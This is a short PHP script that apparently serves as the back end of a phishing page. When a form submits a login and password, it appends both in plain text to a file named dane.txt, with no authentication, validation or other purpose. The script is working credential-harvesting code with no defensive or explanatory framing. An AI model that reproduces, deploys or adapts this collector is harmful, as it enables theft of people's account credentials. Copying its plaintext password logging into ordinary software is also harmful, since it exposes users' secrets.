<?php

if (isset($_POST['login']) && isset($_POST['password']))
{
  $login = $_POST['login'];
  $password = $_POST['password'];

  $dane = fopen('dane.txt', 'a');
  fwrite($dane, $login." ".$password . "\n");
}